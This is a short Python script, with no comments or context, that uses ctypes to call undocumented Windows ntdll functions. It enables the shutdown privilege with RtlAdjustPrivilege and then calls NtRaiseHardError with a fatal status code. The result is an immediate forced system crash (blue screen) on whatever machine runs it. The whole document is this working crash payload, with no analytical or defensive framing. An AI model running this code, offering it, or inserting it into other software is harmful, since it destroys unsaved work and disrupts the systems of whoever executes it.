import ctypes

ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
ctypes.windll.ntdll.NtRaiseHardError(0xc000021a, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))